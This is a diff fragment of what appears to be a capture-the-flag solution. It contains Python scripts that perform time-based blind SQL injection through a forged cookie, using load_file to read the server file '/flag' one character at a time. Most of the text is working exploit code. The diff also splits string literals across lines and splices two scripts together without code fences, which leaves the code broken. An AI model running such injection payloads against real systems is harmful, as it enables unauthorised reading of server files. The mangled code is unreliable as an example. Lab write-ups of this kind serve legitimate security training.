@@ -1287,7 +1227,8 @@ def change(source):
 
 headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
 
-url='http://IP:PORT/'
+url='http://IP:
+PORT/'
 flag=''
 for i in range(1,50):
     left=33
@@ -1298,7 +1239,8 @@ for i in range(1,50):
         payload="'^(substr((select/**/binary/**/load_file(0x2f666c6167)),{i},1)>binary/**/{mid})/**/and/**/sleep(2)^'".format(i=i,mid=hex(mid))
         data='{"data":"0'+change(payload)+'"}'
         cookies={
-        'BestScore':urllib.quote(encode_(secret_key,header,data)),
+        'BestScore':
+urllib.quote(encode_(secret_key,header,data)),
         'CellState':'eyJhbGciOiJTSEEyNTYiLCJ0eXAiOiJKV1QifQ%3D%3D.eyJkYXRhIjoie1wic2NvcmVcIjoxNCxcImdyaWRcIjp7XCJzaXplXCI6NCxcImNlbGxzXCI6W1t7XCJwb3NpdGlvblwiOntcInJvd1wiOjAsXCJjb2x1bW5cIjowfSxcInZhbHVlXCI6XCJQM1wifSx7XCJwb3NpdGlvblwiOntcInJvd1wiOjAsXCJjb2x1bW5cIjoxfSxcInZhbHVlXCI6XCJQMVwifSxudWxsLHtcInBvc2l0aW9uXCI6e1wicm93XCI6MCxcImNvbHVtblwiOjN9LFwidmFsdWVcIjpcIlAyXCJ9XSxbe1wicG9zaXRpb25cIjp7XCJyb3dcIjoxLFwiY29sdW1uXCI6MH0sXCJ2YWx1ZVwiOlwiUDNcIn0sbnVsbCxudWxsLG51bGxdLFtudWxsLG51bGwsbnVsbCxudWxsXSxbe1wicG9zaXRpb25cIjp7XCJyb3dcIjozLFwiY29sdW1uXCI6MH0sXCJ2YWx1ZVwiOlwiUDFcIn0sbnVsbCxudWxsLG51bGxdXX19In0%3D.i1gMALvm9gfZ0D9An5AaPRyusDS54Pcm7gTrpdxkW%2B4%3D'
         }
         
@@ -1313,17 +1255,13 @@ for i in range(1,50):
         print left,right
     flag+=chr(right)
     print flag
-```
-
-
-
-```
 import requests
 import time
 
 headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
 
-url='http://IP:PORT/'
+url='http://IP:
+PORT/'
 flag=''
 for i in range(1,50):
     left=33
